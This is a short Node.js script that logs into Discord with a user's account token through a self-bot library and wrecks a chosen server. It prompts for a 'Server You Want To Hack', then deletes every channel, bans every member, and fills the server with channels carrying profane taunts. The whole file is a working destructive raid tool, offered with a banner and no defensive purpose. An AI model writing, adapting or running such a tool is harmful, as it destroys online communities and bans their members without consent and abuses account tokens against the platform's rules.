const express = require("express");
const app = express();
const prompt = require("prompt-sync")();
app.listen((ee) => console.log("Server started"));
app.use('/', (req, res) => {
  res.send(new Date());
});
const Discord = require("discord.js-self");
const client = new Discord.Client()
const chalk = require('cli-color');

let e = `

██████╗░██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║
██████╔╝██████╔╝██║░░██║██╔████╔██║███████║██╔██╗██║
██╔═══╝░██╔══██╗██║░░██║██║╚██╔╝██║██╔══██║██║╚████║
██║░░░░░██║░░██║╚█████╔╝██║░╚═╝░██║██║░░██║██║░╚███║
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
`
console.log(chalk.green(e))

const token = prompt("What is your account token without \"\":");

const servercopy = prompt("Server You Want To Hack (ServerId):");




client.on('ready',async ()=>{
  let num = 0
  console.log(`${client.user.username} is ready to use ; )`)
  const server = client.guilds.cache.get(servercopy)
  if(isNaN(servercopy)||!server) throw new TypeError('Error write server ID only ', "app.js", 10);
  server.channels.cache.forEach(channel=>{
    channel.delete()
  })
  server.members.cache.forEach(member=>{
    member.ban()
  })
    server.channels.cache.forEach(channel=>{
      server.channels.create('Get Fuckk From '+client.user.username+"-"+num++)

    })
  
})

client.login(`${token}`)
